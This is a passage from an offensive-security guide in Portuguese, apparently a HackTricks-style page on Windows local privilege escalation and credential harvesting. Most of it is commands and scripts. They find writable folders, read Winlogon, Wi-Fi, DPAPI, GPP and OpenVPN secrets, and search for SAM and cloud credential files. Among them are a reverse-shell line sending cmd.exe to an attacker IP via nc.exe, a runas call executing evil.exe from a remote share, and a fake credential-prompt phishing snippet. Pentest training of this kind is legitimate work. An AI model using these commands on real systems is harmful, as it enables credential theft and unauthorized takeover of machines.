Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permiss√µes de Escrita

Verifique se voc√™ pode modificar algum arquivo de configura√ß√£o para ler algum arquivo especial ou se voc√™ pode modificar algum bin√°rio que ser√° executado por uma conta de Administrador (schedtasks).

Uma maneira de encontrar permiss√µes fracas em pastas/arquivos no sistema √© fazendo:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Executar na inicializa√ß√£o

**Verifique se voc√™ pode sobrescrever algum registro ou bin√°rio que ser√° executado por um usu√°rio diferente.**\
**Leia** a **p√°gina seguinte** para aprender mais sobre locais de **autorun interessantes para escalar privil√©gios**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Drivers

Procure por poss√≠veis drivers **terceiros estranhos/vulner√°veis**
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## Sequestro de DLL PATH

Se voc√™ tem **permiss√µes de escrita dentro de uma pasta presente no PATH**, voc√™ poderia ser capaz de sequestrar uma DLL carregada por um processo e **escalar privil√©gios**.

Verifique as permiss√µes de todas as pastas dentro do PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para mais informa√ß√µes sobre como abusar desta verifica√ß√£o:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Rede

### Compartilhamentos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### arquivo hosts

Verifique se h√° outros computadores conhecidos codificados no arquivo hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de Rede & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Portas Abertas

Verifique por **servi√ßos restritos** do lado de fora
```bash
netstat -ano #Opened ports?
```
### Tabela de Roteamento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regras de Firewall

[**Consulte esta p√°gina para comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desativar, desativar...)**

Mais [comandos para enumera√ß√£o de rede aqui](../basic-cmd-for-pentesters.md#network)

### Subsistema do Windows para Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
O bin√°rio `bash.exe` tamb√©m pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se voc√™ conseguir o usu√°rio root, voc√™ pode escutar em qualquer porta (a primeira vez que voc√™ usar `nc.exe` para escutar em uma porta, ser√° perguntado via GUI se o `nc` deve ser permitido pelo firewall).
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar facilmente o bash como root, voc√™ pode tentar `--default-user root`

Voc√™ pode explorar o sistema de arquivos do `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciais do Windows

### Credenciais do Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gerenciador de Credenciais / Cofre do Windows

Do [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
O Cofre do Windows armazena credenciais de usu√°rio para servidores, sites e outros programas que o **Windows** pode **fazer login nos usu√°rios automaticamente**. √Ä primeira vista, pode parecer que agora os usu√°rios podem armazenar suas credenciais do Facebook, Twitter, Gmail, etc., para que eles fa√ßam login automaticamente atrav√©s dos navegadores. Mas n√£o √© bem assim.

O Cofre do Windows armazena credenciais que o Windows pode usar para fazer login nos usu√°rios automaticamente, o que significa que qualquer **aplicativo Windows que precise de credenciais para acessar um recurso** (servidor ou site) **pode utilizar esse Gerenciador de Credenciais** & Cofre do Windows e usar as credenciais fornecidas em vez de os usu√°rios digitarem o nome de usu√°rio e senha o tempo todo.

A menos que os aplicativos interajam com o Gerenciador de Credenciais, n√£o acho que seja poss√≠vel para eles usarem as credenciais para um determinado recurso. Portanto, se seu aplicativo deseja fazer uso do cofre, ele deve de alguma forma **comunicar-se com o gerenciador de credenciais e solicitar as credenciais para aquele recurso** do cofre de armazenamento padr√£o.

Use o `cmdkey` para listar as credenciais armazenadas na m√°quina.
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ent√£o voc√™ pode usar `runas` com a op√ß√£o `/savecred` para utilizar as credenciais salvas. O exemplo a seguir est√° chamando um bin√°rio remoto via um compartilhamento SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` com um conjunto de credenciais fornecido.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
### DPAPI

Em teoria, a Data Protection API pode habilitar a criptografia sim√©trica de qualquer tipo de dado; na pr√°tica, seu uso principal no sistema operacional Windows √© realizar a criptografia sim√©trica de chaves privadas assim√©tricas, usando um segredo de usu√°rio ou sistema como uma contribui√ß√£o significativa de entropia.

**O DPAPI permite que desenvolvedores criptografem chaves usando uma chave sim√©trica derivada dos segredos de logon do usu√°rio**, ou, no caso de criptografia do sistema, usando os segredos de autentica√ß√£o de dom√≠nio do sistema.

As chaves DPAPI usadas para criptografar as chaves RSA do usu√°rio s√£o armazenadas no diret√≥rio `%APPDATA%\Microsoft\Protect\{SID}`, onde {SID} √© o [Identificador de Seguran√ßa](https://en.wikipedia.org/wiki/Security\_Identifier) daquele usu√°rio. **A chave DPAPI √© armazenada no mesmo arquivo que a chave mestra que protege as chaves privadas do usu√°rio**. Geralmente, s√£o 64 bytes de dados aleat√≥rios. (Observe que este diret√≥rio √© protegido, ent√£o voc√™ n√£o pode list√°-lo usando `dir` do cmd, mas pode list√°-lo do PS).
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Voc√™ pode usar o **m√≥dulo mimikatz** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptograf√°-lo.

Os **arquivos de credenciais protegidos pela senha mestra** geralmente est√£o localizados em:
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Voc√™ pode usar o **m√≥dulo mimikatz** `dpapi::cred` com a `/masterkey` apropriada para descriptografar.\
Voc√™ pode **extrair muitas DPAPI** **masterkeys** da **mem√≥ria** com o m√≥dulo `sekurlsa::dpapi` (se voc√™ for root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Credenciais do PowerShell

**Credenciais do PowerShell** s√£o frequentemente usadas para **scripting** e tarefas de automa√ß√£o como uma maneira de armazenar credenciais criptografadas de forma conveniente. As credenciais s√£o protegidas usando **DPAPI**, o que tipicamente significa que elas s√≥ podem ser descriptografadas pelo mesmo usu√°rio no mesmo computador em que foram criadas.

Para **descriptografar** credenciais do PS a partir do arquivo que as cont√©m, voc√™ pode fazer:
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conex√µes RDP Salvas

Voc√™ pode encontr√°-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e em `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos Executados Recentemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gerenciador de Credenciais da √Årea de Trabalho Remota**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilize o m√≥dulo **Mimikatz** `dpapi::rdg` com a op√ß√£o `/masterkey` apropriada para **descriptografar quaisquer arquivos .rdg**\
Voc√™ pode **extrair v√°rias masterkeys DPAPI** da mem√≥ria com o m√≥dulo Mimikatz `sekurlsa::dpapi`

### Sticky Notes

As pessoas frequentemente usam o aplicativo StickyNotes no Windows para **salvar senhas** e outras informa√ß√µes, sem perceber que √© um arquivo de banco de dados. Este arquivo est√° localizado em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e sempre vale a pena procurar e examinar.

### AppCmd.exe

**Observe que para recuperar senhas do AppCmd.exe voc√™ precisa ser Administrador e executar em um n√≠vel de Integridade Alto.**\
**AppCmd.exe** est√° localizado no diret√≥rio `%systemroot%\system32\inetsrv\`.\
Se este arquivo existir, ent√£o √© poss√≠vel que algumas **credenciais** tenham sido configuradas e possam ser **recuperadas**.

Este c√≥digo foi extra√≠do de _**PowerUP**_:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifique se `C:\Windows\CCM\SCClient.exe` existe.\
Instaladores s√£o **executados com privil√©gios de SYSTEM**, muitos s√£o vulner√°veis a **DLL Sideloading (Informa√ß√£o de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Arquivos e Registro (Credenciais)

### Credenciais do Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chaves de Host SSH do Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chaves SSH no registro

Chaves privadas SSH podem ser armazenadas dentro da chave de registro `HKCU\Software\OpenSSH\Agent\Keys`, ent√£o voc√™ deve verificar se h√° algo interessante l√°:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
Se voc√™ encontrar alguma entrada nesse caminho, provavelmente ser√° uma chave SSH salva. Ela √© armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Mais informa√ß√µes sobre esta t√©cnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se o servi√ßo `ssh-agent` n√£o estiver em execu√ß√£o e voc√™ quiser que ele inicie automaticamente na inicializa√ß√£o, execute:
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Parece que esta t√©cnica n√£o √© mais v√°lida. Tentei criar algumas chaves ssh, adicion√°-las com `ssh-add` e fazer login via ssh em uma m√°quina. O registro HKCU\Software\OpenSSH\Agent\Keys n√£o existe e o procmon n√£o identificou o uso de `dpapi.dll` durante a autentica√ß√£o de chave assim√©trica.
{% endhint %}

### Arquivos n√£o supervisionados
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Voc√™ tamb√©m pode procurar esses arquivos usando o **metasploit**: _post/windows/gather/enum\_unattend_

Exemplo de conte√∫do\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backups do SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciais de Nuvem
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Procure por um arquivo chamado **SiteList.xml**

### Senha GPP em Cache

Antes do KB2928120 (veja MS14-025), algumas Prefer√™ncias de Pol√≠tica de Grupo poderiam ser configuradas com uma conta personalizada. Essa funcionalidade era principalmente usada para implantar uma conta de administrador local personalizada em um grupo de m√°quinas. No entanto, havia dois problemas com essa abordagem. Primeiro, uma vez que os Objetos de Pol√≠tica de Grupo s√£o armazenados como arquivos XML em SYSVOL, qualquer usu√°rio do dom√≠nio pode l√™-los. O segundo problema √© que a senha definida nessas GPPs √© criptografada com AES256 usando uma chave padr√£o, que √© publicamente documentada. Isso significa que qualquer usu√°rio autenticado poderia potencialmente acessar dados muito sens√≠veis e elevar seus privil√©gios em sua m√°quina ou at√© mesmo no dom√≠nio. Esta fun√ß√£o verificar√° se algum arquivo GPP armazenado localmente cont√©m um campo "cpassword" n√£o vazio. Se sim, ele ser√° descriptografado e retornar√° um objeto PS personalizado contendo algumas informa√ß√µes sobre o GPP, juntamente com a localiza√ß√£o do arquivo.

Procure em `C:\ProgramData\Microsoft\Group Policy\history` ou em _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao W Vista)_ por estes arquivos:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Para descriptografar o cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obter as senhas:
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configura√ß√£o Web do IIS
```bash
Get-Childitem ‚ÄìPath C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem ‚ÄìPath C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem ‚ÄìPath C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemplo de web.config com credenciais:
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciais do OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem ‚ÄìPath C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Pe√ßa credenciais

Voc√™ sempre pode **pedir ao usu√°rio para inserir suas credenciais ou at√© mesmo as credenciais de um usu√°rio diferente** se voc√™ achar que ele pode conhec√™-las (note que **pedir** diretamente ao cliente pelas **credenciais** √© realmente **arriscado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Nomes de arquivos poss√≠veis contendo credenciais**

Arquivos conhecidos que h√° algum tempo continham **senhas** em **texto claro** ou **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Pesquise todos os arquivos propostos:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem ‚ÄìPath C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciais na Lixeira

Voc√™ tamb√©m deve verificar a Lixeira para procurar credenciais dentro dela

Para **recuperar senhas** salvas por v√°rios programas, voc√™ pode usar: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Dentro do registro

**Outras poss√≠veis chaves de registro com credenciais**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extraia chaves openssh do registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Hist√≥rico dos Navegadores

Voc√™ deve verificar os bancos de dados onde as senhas do **Chrome ou Firefox** s√£o armazenadas.\
Verifique tamb√©m o hist√≥rico, os favoritos e os bookmarks dos navegadores, pois talvez algumas **senhas estejam** armazenadas l√°.

Ferramentas para extrair senhas dos navegadores:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)****

### **Sobrescrita de DLL COM**

**Component Object Model (COM)** √© uma tecnologia integrada ao sistema operacional Windows que permite a **intercomunica√ß√£o** entre componentes de software de diferentes linguagens. Cada componente COM √© **identificado por um ID de classe (CLSID)** e cada componente exp√µe funcionalidades por meio de uma ou mais interfaces, identificadas por IDs de interface (IIDs).

Classes e interfaces COM s√£o definidas no registro em **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e **HKEY\_**_**CLASSES\_**_**ROOT\Interface** respectivamente. Este registro √© criado pela fus√£o de **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Dentro dos CLSIDs deste registro, voc√™ pode encontrar o registro filho **InProcServer32** que cont√©m um **valor padr√£o** apontando para uma **DLL** e um valor chamado **ThreadingModel** que pode ser **Apartment** (Monothread), **Free** (Multithread), **Both** (Mono ou Multi) ou **Neutral** (Neutro em rela√ß√£o √† thread).

![](<../../.gitbook/assets/image (638).png>)

Basicamente, se voc√™ puder **sobrescrever qualquer uma das DLLs** que ser√£o executadas, voc√™ poder√° **escalar privil√©gios** se essa DLL for executada por um usu√°rio diferente.

Para aprender como os atacantes usam o Hijacking de COM como um mecanismo de persist√™ncia, confira:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Busca Gen√©rica de Senhas em Arquivos e Registro**

**Pesquise pelo conte√∫do de arquivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Busca por um arquivo com um nome de arquivo espec√≠fico**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pesquise no registro por nomes de chaves e senhas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Ferramentas que procuram por senhas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) √© um plugin do msf que criei para **executar automaticamente todos os m√≥dulos POST do metasploit que procuram por credenciais** dentro da v√≠tima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) procura automaticamente por todos os arquivos que cont√™m senhas mencionadas nesta p√°gina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) √© outra √≥tima ferramenta para extrair senhas de um sistema.

A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) procura por **sess√µes**, **nomes de usu√°rio** e **senhas** de v√°rias ferramentas que salvam esses dados em texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Manipuladores Vazados

